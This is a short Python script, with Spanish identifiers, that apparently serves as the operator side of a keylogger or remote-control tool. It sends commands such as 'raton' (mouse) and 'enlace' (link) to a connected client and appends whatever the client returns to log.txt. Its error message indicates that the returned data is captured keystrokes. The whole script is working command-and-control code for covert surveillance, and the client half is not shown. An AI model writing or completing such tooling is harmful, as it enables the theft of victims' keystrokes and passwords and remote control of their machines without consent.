from servidor import *
import sys

class servidore(Server):
    def __init__(self):
        super().__init__()
            
    def run(self):   
        while True: 
            mensaje= input("-> ")
            if mensaje == "exit":
                self.con.close()
                sys.exit()
            elif mensaje == "r":
                self.con.send("raton".encode())
            elif mensaje == "e":
                self.con.send("enlace".encode())
            else:
                self.con.send(mensaje.encode())
            try:
                datos=self.con.recv(1024).decode()
                with open("log.txt","a") as f:
                    f.write(datos)
            except:
                print("No se agregó ninguna tecla")
if __name__ == "__main__":
    mio = servidore()
    mio.run()